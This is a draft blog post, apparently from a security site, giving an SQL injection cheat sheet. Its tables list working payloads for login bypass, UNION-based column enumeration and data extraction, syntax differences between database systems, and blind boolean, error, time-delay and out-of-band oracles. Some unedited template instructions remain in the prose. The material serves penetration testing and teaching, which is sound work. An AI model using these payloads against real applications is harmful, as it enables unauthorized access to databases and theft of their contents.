---
title: "SQL Injection — Cheat Sheet"
author: marie
date: 2026-04-20T00:00:00-07:00
# `Cheat Sheets` is a top-level content-type category (like Labs), sub-categorized
# by domain. Pick the sub that matches the subject: Web Security / Cloud Security
# / Tooling. A post lives in exactly one path (see categories-and-tags.md).
categories: ["Cheat Sheets", "Web Security"]
# Tags: the subject/vuln-class tag(s) only. Do NOT tag `cheat-sheet` — the
# category already conveys it. 3–6 tags total, all from the taxonomy.
tags: [sqli, burp-suite, ]
description: "Condensed, high-density SQL injection reference — payloads, DBMS syntax differences, and detection tricks in one scannable table."
pin: false
toc: true
comments: true
math: false
mermaid: false
image:
  path: ""
  alt: ""
hidden: true
---

> **What this is** — A reference sheet, not a walkthrough. One scannable page you can `Ctrl+F` mid-engagement. The table *is* the post; prose is kept to the minimum needed to use the table correctly.
{: .prompt-info }

## How to use this sheet

Two or three sentences max: what this covers, the assumed context (e.g. "you've confirmed an injectable parameter"), and any convention used below (e.g. `--` = comment, `+` = URL-encoded space). Keep it tight — a reader is here for the table, not the intro.

**Conventions:** `--` comment to EOL · `+` = URL-encoded space · `[T]`/`[C]` = target table/column · payloads shown pre-encoding unless noted.

## Core reference

The main table. Keep one idea per row, sorted so related rows sit together. Prefer many narrow rows over a few dense ones — density comes from *coverage*, not cramming.

| Goal | Payload | Notes / when to use |
|---|---|---|
| Test for injection | `'` | Error or behavior change ⇒ injectable. |
| Boolean-true (subvert logic) | `'+OR+1=1--` | Returns all rows; comment kills trailing conditions. |
| Login bypass | `administrator'--` | Comments out the password check. |
| Comment out rest of query | `'--` / `'#` / `'/*` | `#` MySQL · `--` most · `/*` C-style. |
| Determine column count | `'+ORDER+BY+N--` | Increment N until error. |
| Determine column count (UNION) | `'+UNION+SELECT+NULL,NULL--` | Add NULLs until no error. |
| Find text-compatible column | `'+UNION+SELECT+NULL,'a',NULL--` | No error ⇒ that column takes strings. |
| Exfiltrate two values, one column | `'+UNION+SELECT+NULL,a||'~'||b--` | Concatenation differs per DBMS (see below). |

## DBMS quick differences

The reference that actually earns its keep — the per-database quirks you always forget. Trim columns to what you truly use.

| Task | Oracle | MySQL | MSSQL | PostgreSQL |
|---|---|---|---|---|
| Version | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT @@version` | `SELECT version()` |
| Comment | `--` | `-- ` (note space) / `#` | `--` | `--` |
| String concat | `'a'||'b'` | `CONCAT('a','b')` | `'a'+'b'` | `'a'||'b'` |
| Substring | `SUBSTR()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` |
| Time delay | `dbms_pipe.receive_message(('a'),10)` | `SLEEP(10)` | `WAITFOR DELAY '0:0:10'` | `pg_sleep(10)` |
| Dummy table needed? | yes (`FROM dual`) | no | no | no |

## Blind extraction oracles

When there's no direct output, pick the oracle you have. One row per technique — payload plus the signal you read.

| Oracle | Payload skeleton | Signal you read |
|---|---|---|
| Conditional response | `'+AND+SUBSTRING((subquery),1,1)='a'--` | Page content differs on true/false. |
| Conditional error | `'+AND+(SELECT+CASE+WHEN+(cond)+THEN+1/0+ELSE+NULL+END)--` | Error appears only when true. |
| Time delay | `'+AND+(SELECT+SLEEP(10)+WHERE+cond)--` | Response is delayed on true. |
| Out-of-band (OAST) | `'+UNION+SELECT+extractvalue(...collaborator...)--` | DNS/HTTP hit in Collaborator. |

## Gotchas

Short bullet list of the things that waste ten minutes: encoding pitfalls, the space-after-`--` in MySQL, when the injection point isn't at the end of the query, when to switch to sqlmap. Keep each to one line.

- MySQL `--` needs a trailing space; use `#` to avoid the footgun.
- If your quote lands *inside* a string, you must balance it before the payload is valid SQL.
- Injection not at end of query ⇒ comment (`--`) may not neutralize what follows.

## References

- PortSwigger SQLi cheat sheet: <https://portswigger.net/web-security/sql-injection/cheat-sheet>
- PortSwigger SQL injection: <https://portswigger.net/web-security/sql-injection>
- CWE-89: <https://cwe.mitre.org/data/definitions/89.html>
